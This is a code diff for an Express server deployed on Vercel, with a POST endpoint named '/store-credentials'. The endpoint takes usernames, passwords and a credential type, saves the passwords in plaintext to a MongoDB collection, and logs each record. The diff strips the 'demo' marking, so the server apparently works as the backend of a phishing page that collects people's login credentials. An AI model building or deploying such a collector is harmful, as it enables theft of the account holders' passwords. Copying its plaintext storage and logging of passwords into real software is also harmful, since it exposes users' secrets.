@@ -7,60 +7,53 @@ const path = require("path");
 const app = express();
 app.use(express.json());
 
-// Serve static files
+// Static files
 app.use(express.static(path.join(__dirname, "public")));
 app.use("/src", express.static(path.join(__dirname, "src")));
 
-// MongoDB setup (reuse client in serverless)
-const client = new MongoClient(process.env.MONGODB_URI, {
-  maxPoolSize: 10
-});
-
-let collection;
-let isConnected = false;
+// MongoDB (serverless-safe)
+let cachedClient = null;
+let cachedDb = null;
 
 async function connectDB() {
-  if (isConnected) return;
+  if (cachedDb) return cachedDb;
 
-  try {
-    await client.connect();
-    const db = client.db("dkwin_data");
-    collection = db.collection("credentials_demo");
-    isConnected = true;
-    console.log("MongoDB connected (demo mode)");
-  } catch (err) {
-    console.error("MongoDB connection failed:", err.message);
-  }
+  const client = new MongoClient(process.env.MONGODB_URI, {
+    serverSelectionTimeoutMS: 5000,
+  });
+
+  await client.connect();
+  const db = client.db("dkwin_data");
+
+  cachedClient = client;
+  cachedDb = db;
+
+  console.log("MongoDB connected");
+  return db;
 }
 
-// Connect once (serverless-safe)
-connectDB();
-
-// API endpoint
+// API
 app.post("/store-credentials", async (req, res) => {
   try {
     const { type, username, password } = req.body;
 
-    if (!collection) {
-      return res.status(503).json({ error: "Database not ready" });
-    }
+    const db = await connectDB();
+    const collection = db.collection("credentials_demo");
 
     const record = {
       type,
       username,
-      password, // ✅ FIXED
-      demo: true,
-      timestamp: new Date()
+      password, // demo purpose
+      timestamp: new Date(),
     };
 
     await collection.insertOne(record);
+    console.log("Stored:", record);
 
-    console.log("Simulated data stored:", record);
-    res.json({ message: "Demo data stored" });
-
+    res.json({ message: "Stored" });
   } catch (err) {
-    console.error("DB insert error:", err);
-    res.status(500).json({ error: "Database error" });
+    console.error("DB error:", err.message);
+    res.status(500).json({ error: "DB failed" });
   }
 });
 
@@ -69,8 +62,5 @@ app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "public", "index.html"));
 });
 
-// Required for local testing (ignored by Vercel)
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-  console.log(`Server running on http://localhost:${PORT}`);
-});
+// 🔴 IMPORTANT: NO app.listen() ON VERCEL
+module.exports = app;
